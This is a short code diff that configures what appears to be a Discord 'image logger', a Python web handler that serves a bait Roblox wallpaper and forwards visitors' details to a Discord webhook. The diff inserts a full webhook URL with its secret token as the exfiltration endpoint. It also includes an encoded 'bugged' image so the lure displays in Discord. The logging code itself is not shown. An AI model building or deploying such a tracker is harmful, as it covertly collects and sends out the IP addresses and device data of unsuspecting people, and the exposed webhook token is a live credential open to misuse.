@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'WEBHOOK'
+webhook = 'https://discord.com/api/webhooks/985248510553239573/YR3MdxOChzauf-gIFBfYEI-BpnwVdEyMRrE6vVJo89Y5TsKF9agSbKT7kiNPVjvjWqi4'
 
-bindata = httpx.get('link to image here').content
+bindata = httpx.get('https://www.google.com/imgres?imgurl=https%3A%2F%2Fcutewallpaper.org%2F22%2Froblox-cute-wallpapers%2F229477317.jpg&imgrefurl=https%3A%2F%2Fcutewallpaper.org%2F22%2Froblox-cute-wallpapers%2Fview-page-22.html&tbnid=yxWWCN1ia23qEM&vet=12ahUKEwi0g9-Ogqb4AhVNOLkGHeB7CNAQMyg4egQIARBQ..i&docid=S77ZWXq3ZKuN-M&w=474&h=474&q=imagem%20de%20gfx%20roblox%204k&hl=pt-BR&ved=2ahUKEwi0g9-Ogqb4AhVNOLkGHeB7CNAQMyg4egQIARBQ#imgrc=yxWWCN1ia23qEM&imgdii=OHvhRv_c4YXGZM').content
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
